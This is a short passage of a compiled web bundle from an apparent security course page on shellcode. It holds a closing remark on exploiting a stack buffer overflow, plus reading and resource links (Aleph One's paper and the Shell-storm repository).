and place it in the environment, then exploit the stack buffer overflow to actually run it."),(0,l.yg)("h2",{id:"further-reading"},"Further Reading"),(0,l.yg)("p",null,(0,l.yg)("a",{parentName:"p",href:"http://phrack.org/issues/49/14.html"},'"Smashing The Stack For Fun And Profit", Aleph One')," - a legendary attack paper documenting stack buffer overflows and shellcodes.\nAs it is written in '96, the examples in it will probably ",(0,l.yg)("em",{parentName:"p"},"not")," work (either out-of-the-box or with some tweaks).\nWe recommend perusing it for its historical/cultural significance, but don't waste much time on the technical details of the examples."),(0,l.yg)("h2",{id:"resources"},"Resources"),(0,l.yg)("p",null,(0,l.yg)("a",{parentName:"p",href:"http://shell-storm.org/shellcode/"},"Shell-storm")," - a repository of shellcodes."))}h.isMDXComponent=!0},6680:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/shellcode_above-8bd12af8a95e585ecbbdee364d2cf1cf.png"},6812:(e,n,t)=>{t.d(n,{A:()=>a});const a=t.p+"assets/images/shellcode_below-789839baadbaa991009ac8100fc817d6.png"}}]);